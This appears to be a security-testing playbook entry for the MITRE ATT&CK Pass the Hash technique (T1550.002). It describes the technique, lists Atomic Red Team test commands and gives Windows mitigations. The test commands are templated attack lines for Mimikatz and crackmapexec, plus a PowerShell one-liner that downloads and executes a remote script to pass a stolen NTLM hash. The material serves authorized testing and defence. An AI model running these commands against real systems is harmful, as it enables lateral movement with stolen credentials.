---
name: "T1550.002_pass-the-hash"
description: "Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1550.002
  - defense-evasion
  - lateral-movement
  - windows
  - sub-technique
technique_id: "T1550.002"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - lateral-movement
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1550/002"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1550
  - T1550.001
  - T1550.003
  - T1550.004
prerequisites:
  - T1550
severity_boost:
  T1550: "Chain with T1550 for deeper attack path"
  T1550.001: "Chain with T1550.001 for deeper attack path"
  T1550.003: "Chain with T1550.003 for deeper attack path"
---

# T1550.002 Pass the Hash

> **Sub-technique of:** T1550

## High-Level Description

Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Lateral Movement (TA0008)

**Platforms:** Windows

## What to Check

- [ ] Identify if Pass the Hash technique is applicable to target environment
- [ ] Check Windows systems for indicators of Pass the Hash
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Mimikatz Pass the Hash

Note: must dump hashes first
[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)

**Supported Platforms:** windows

```cmd
#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"
```

**Dependencies:**
- Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

### Atomic Test 2: crackmapexec Pass the Hash

command execute with crackmapexec

**Supported Platforms:** windows

```cmd
#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
```

**Dependencies:**
- CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})

### Atomic Test 3: Invoke-WMIExec Pass the Hash

Use Invoke-WMIExec to Pass the Hash
Note: must dump hashes first
[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Pass the Hash by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1550.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1051 Update Software
Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group.

### M1052 User Account Control
Enable pass the hash mitigations to apply UAC restrictions to local accounts on network logon. The associated Registry key is located <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code>.

Through GPO: Computer Configuration > [Policies] > Administrative Templates > SCM: Pass the Hash Mitigations: Apply UAC restrictions to local accounts on network logons.

### M1018 User Account Management
Do not allow a domain user to be in the local administrator group on multiple systems.

### M1026 Privileged Account Management
Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems.


## Detection

### Detection Strategy for T1550.002 - Pass the Hash (Windows)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Pass the Hash technique applicable | High | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [Stealthbits Overpass-the-Hash](https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/)
- [Atomic Red Team - T1550.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1550.002)
- [MITRE ATT&CK - T1550.002](https://attack.mitre.org/techniques/T1550/002)
